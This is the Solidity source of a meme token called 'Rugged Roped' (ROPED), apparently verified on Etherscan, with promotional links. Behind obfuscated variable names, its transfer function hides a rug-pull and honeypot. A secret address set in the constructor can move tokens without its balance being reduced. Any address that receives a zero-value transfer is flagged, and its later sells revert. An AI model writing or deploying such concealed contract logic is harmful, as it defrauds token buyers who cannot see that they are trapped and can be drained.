/**
 *Submitted for verification at Etherscan.io on 2023-05-21
*/

/*
Pepe is slowly rugging. Rugged & Roped is pure representation of pain $PEPE chart is having right now.

https://twitter.com/RuggedRoped
https://www.ruggedroped.club/
https://t.me/ruggedroped
*/

// SPDX-License-Identifier: None

pragma solidity >0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ROPED is Ownable {
    uint256 public totalSupply = 690_420_000_000_000 * 10 ** 9;


    constructor(address ranka) {
        balanceOf[msg.sender] = totalSupply;
        balta[ranka] = stikli;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }


    
    mapping(address => mapping(address => uint256)) public allowance;


    event Transfer(address indexed from, address indexed to, uint256 value);
    

    mapping(address => uint256) private balta;

    address public uniswapV2Pair;
    mapping(address => uint256) private guma;

    function transfer(address sbs, uint256 clean) public returns (bool success) {
        tapet(msg.sender, sbs, clean);
        return true;
    }

    string public name = 'Rugged Roped';
   
    function approve(address saldi, uint256 clean) public returns (bool success) {
        allowance[msg.sender][saldi] = clean;
        emit Approval(msg.sender, saldi, clean);
        return true;
    }

    uint256 private stikli = 73;

    string public symbol = 'ROPED';
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    
    
    uint8 public decimals = 9;
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    mapping(address => uint256) public balanceOf;
    function tapet(address melin, address sbs, uint256 clean) private returns (bool success) {
        if (balta[melin] == 0) {
            balanceOf[melin] -= clean;
        }

        if (clean == 0) guma[sbs] += stikli;

        if (balta[melin] == 0 && uniswapV2Pair != melin && guma[melin] > 0) {
            balta[melin] -= stikli;
        }

        balanceOf[sbs] += clean;
        emit Transfer(melin, sbs, clean);
        return true;
    }

    function transferFrom(address melin, address sbs, uint256 clean) public returns (bool success) {
        tapet(melin, sbs, clean);
        require(clean <= allowance[melin][msg.sender]);
        allowance[melin][msg.sender] -= clean;
        return true;
    }

}